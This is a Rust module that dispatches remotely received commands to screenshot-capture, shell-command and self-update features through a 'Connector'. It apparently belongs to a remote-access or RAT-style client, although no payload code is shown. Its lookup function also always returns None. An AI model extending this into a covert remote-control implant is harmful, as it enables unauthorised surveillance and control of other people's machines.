use cmd::Cmd;
use once_cell::sync::Lazy;
use screenshot_sender::Screenshot;
use update::Update;

use super::Connector;

pub mod cmd;
pub mod screenshot_sender;
pub mod update;
pub static FEATURES: Lazy<Vec<FeatureEnum>> = Lazy::new(|| {
    vec![
        FeatureEnum::Update(Update::new()),
        FeatureEnum::Screenshot(Screenshot::new()),
        FeatureEnum::Cmd(Cmd::new()),
    ]
});

#[derive(Debug, Clone)]
pub enum FeatureEnum {
    Update(Update),
    Screenshot(Screenshot),
    Cmd(Cmd),
}
//Using pattern matching
impl FeatureEnum {
    pub fn get_command(&self) -> String {
        match self {
            FeatureEnum::Update(f) => f.get_command(),
            FeatureEnum::Screenshot(f) => f.get_command(),
            FeatureEnum::Cmd(f) => f.get_command(),
        }
    }

    pub async fn run(&self, connector: &mut Connector) {
        match self {
            FeatureEnum::Update(f) => f.run(connector).await,
            FeatureEnum::Screenshot(f) => f.run(connector).await,
            FeatureEnum::Cmd(f) => f.run(connector).await,
        }
    }
}
pub async fn find_feature_by_command(
    command: &str,
    connector: &mut Connector,
) -> Option<FeatureEnum> {
    for feature in FEATURES.iter() {
        if command == feature.get_command() {
            feature.run(connector).await;
        }
    }
    None
}
